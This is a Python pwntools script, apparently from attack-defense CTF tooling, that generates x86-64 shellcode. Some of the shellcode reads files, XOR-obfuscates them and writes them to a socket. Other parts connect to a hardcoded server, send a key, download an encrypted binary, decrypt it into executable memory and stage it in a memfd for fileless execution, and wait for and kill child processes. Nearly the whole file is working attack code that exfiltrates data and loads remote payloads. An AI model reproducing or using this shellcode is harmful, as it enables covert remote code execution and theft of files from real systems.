from turtle import pu
from pwn import *
import hashlib

FS_HOST = "134.209.231.196"
FS_PORT = 9999
OPTION_FILE = "/tmp/option"

def pushstr(str):
    payload = shellcraft.amd64.pushstr(str)
    cnt = 0
    for line in payload.split("\n"):
        if "push" in line and "/*" not in line:
            cnt += 1
    # payload += '    pop rax\n' * cnt
    return payload

def popstr(str):
    payload = shellcraft.amd64.pushstr(str)
    cnt = 0
    for line in payload.split("\n"):
        if "push" in line and "/*" not in line:
            cnt += 1
    payload = '    pop rax\n' * cnt
    return payload

def readfile(str):
    # payload = shellcraft.amd64.linux.readfile(str, "rbp")

    # payload += popstr(str)
    # payload += '    sub rsp, 48\n'
    payload = f'''{pushstr(str)}
    /* call open('OP', 'O_RDONLY') */
    mov rdi, rsp
    mov rsi, 0
    mov rax, 2
    syscall
    mov r10, rax
    {popstr(str)}
    cmp r10, 0
    jl end_{str.replace("/", "_")}_end

    /* call fstat('rax', 'rsp') */
    mov rdi, r10
    push SYS_fstat /* 5 */
    pop rax
    mov rsi, rsp
    syscall

    /* Get file size */
    add rsp, 48
    mov rdx, [rsp]
    sub rsp, 48

    /* call read(r10, rsp, rdx) */
    sub rsp, 0x30
    mov rdi, r10
    mov rsi, rsp
    mov rax, 0
    syscall

    /* call close(r10) */
    mov rax, 3
    mov rdi, r10
    syscall

    mov rbx, rdx
    mov rdx, 0
    /* xor encrypt */
loop_{str.replace("/", "_")}:
    cmp rdx, rbx
    jge end_{str.replace("/", "_")}
    xor rax, rax
    mov al, byte ptr [rsp + rdx]
    mov rcx, rdx
    shl rcx, 4
    add rcx, 97436
    xor rcx, 0x69
    xor rax, rcx
    mov byte ptr [rsp + rdx], al
    inc rdx
    jmp loop_{str.replace("/", "_")}

end_{str.replace("/", "_")}:
    /* call write(rbp, rsp, rdx) */
    mov rdi, rbp
    mov rsi, rsp
    mov rax, 1
    syscall

    add rsp, 0x30
end_{str.replace("/", "_")}_end:
    '''
    return payload
    


def get_key():
    f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/env.h", "r")
    for line in f:
        if "KEY" in line:
            return line.split(" ")[2].strip().replace("\"", "")
    return None

def get_encryption_key():
    f = open("/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/env.h", "r")
    for line in f:
        if "ENC_KEY" in line:
            return line.split(" ")[2].strip().replace("\"", "")
    return None

def what_do_I_want(bit):
    # 1 requests the same proc as the last one
    # 0 requests the opposite proc as the last one

    payload = f'''{pushstr(OPTION_FILE)}
    /* call open('OP', 'O_CREAT | O_RDWR | O_TRUNC', 0666) */
    mov rdi, rsp
    mov rsi, 0x242
    mov rdx, 0666
    mov rax, 2
    syscall
    mov r10, rax
    {popstr(OPTION_FILE)}

    /* call write(r10, rsp, 1) */
    push {bit}
    mov rsi, rsp
    mov rdi, r10
    mov rdx, 1
    mov rax, 1
    syscall
    pop rax
    
    /* call close(r10) */
    mov rax, 3
    mov rdi, r10
    syscall
    '''
    return payload

def encode_fn(data):
    aux = bytes.fromhex(hashlib.md5(data.encode()).hexdigest())
    encoded = list(aux)
    for i in range(len(aux) - 1):
        encoded[i] = (encoded[i] ^ encoded[len(aux) - 1]) ^ ((69 + (i << 7) * 1543453) % 256)

    return b"".join([bytes([x]) for x in encoded])

def get_binary_from_server(name):
    encoded_fn = encode_fn(name)
    print(f"Encoded filename: {encoded_fn}")

    key = get_key()
    payload = f'''{shellcraft.amd64.linux.connect(FS_HOST, FS_PORT, )}
    cmp rax, 0
    jl error

    pop rax
    /* send key */
    {pushstr(key)}
    mov rdi, rbp
    mov rsi, rsp
    mov rdx, {len(key)}
    mov rax, 1
    syscall
    {popstr(key)}

    /* send binary name */
    {pushstr(encoded_fn)}
    mov rdi, rbp
    mov rsi, rsp
    mov rdx, 16
    mov rax, 1
    syscall
    {popstr(encoded_fn)}

    /* get length of binary */
    mov rdi, rbp
    mov rsi, rsp
    mov rdx, 2
    mov rax, 0
    syscall

    /* check if len is valid */
    cmp rax, 2
    jne error
    cmp word ptr [rsp], 0x6969
    je error
    xor rax, rax
    mov al, byte ptr [rsp + 1]
    mov ah, byte ptr [rsp]
    mov rbx, rax
    pop rax

    /* call mmap(0, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) */
    xor rdi, rdi
    mov rsi, 0xb000
    mov rdx, 7
    mov r10, 34
    mov r8, -1
    xor r9, r9
    mov rax, 9
    syscall

    /* save mmap address */
    mov r9, rax
    mov qword ptr [rsp], rax
    mov r13, 0

    /* r13 crt; r9 addr; rbx len */
lup_get:
    cmp r13, rbx
    jge end_get

    /* call read(rbp, r9, rbx) */
    mov rdi, rbp
    mov rsi, r9
    mov rdx, 1024
    mov rax, 0
    syscall
    cmp rax, 0
    jle end_get

    add r13, rax
    add r9, rax
    jmp lup_get


end_get:
    
    mov r9, qword ptr [rsp]

    /* decrypt */
    mov r13, 0
    /* r13 crt; r9 addr; rbx len */
dec_{name.replace("/", "_")}:
    cmp r13, rbx
    jge dec_end_{name.replace("/", "_")}
    xor rax, rax
    mov al, byte ptr [r9 + r13]
    mov rcx, r13
    shl rcx, 4
    add rcx, 97436
    xor rcx, 0x69
    xor rax, rcx
    mov byte ptr [r9 + r13], al
    inc r13
    jmp dec_{name.replace("/", "_")}

dec_end_{name.replace("/", "_")}:

    /* call close(rbp) */
    mov rax, 3
    mov rdi, rbp
    syscall

    /* call memfd_create */
    mov rdi, rsp
    mov rsi, 1
    mov rax, 319
    syscall

    /* save memfd fd */
    mov r10, rax

    /* call write(r10, r9, rbx) */
    mov rdi, r10
    mov rsi, r9
    mov rdx, rbx
    mov rax, 1
    syscall

    /* call munmap(r9, rbx) */
    mov rdi, r9
    mov rsi, 0xb000
    mov rax, 11
    syscall

    pop rax
    mov rbp, r10

    '''
    return payload


debarasare = ''' /* wait for child to finish */
    /* save pid */
    mov r11, rax

    /* call waitid(P_ALL, 0, rsp, WEXITED, NULL) */
    mov rax, 247
    mov rdi, 0
    mov rsi, 0
    mov rdx, rsp
    mov r10, 4
    mov r8, 0

    syscall

    /* call kill(pid, SIGKILL) */
    mov rax, 62
    mov rdi, r11
    mov rsi, 9
    syscall
'''